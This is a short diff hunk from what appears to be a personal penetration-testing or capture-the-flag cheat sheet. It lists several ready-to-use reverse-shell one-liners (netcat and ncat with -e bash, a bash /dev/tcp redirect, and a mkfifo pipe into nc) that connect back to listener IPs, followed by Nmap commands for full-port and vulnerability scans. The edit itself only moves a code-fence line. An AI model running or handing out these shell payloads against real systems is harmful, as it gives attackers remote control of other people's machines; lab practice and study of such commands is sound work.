@@ -4,8 +4,9 @@ nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
-```shell
+```
 # Nmap_enumeration ✅
+```shell
 sudo nmap -p- <ip> -sV -T5
 sudo nmap -p- <ip> -sV -T5 -Pn
 sudo nmap 139,445 <ip> -sV -T5 --script=vuln
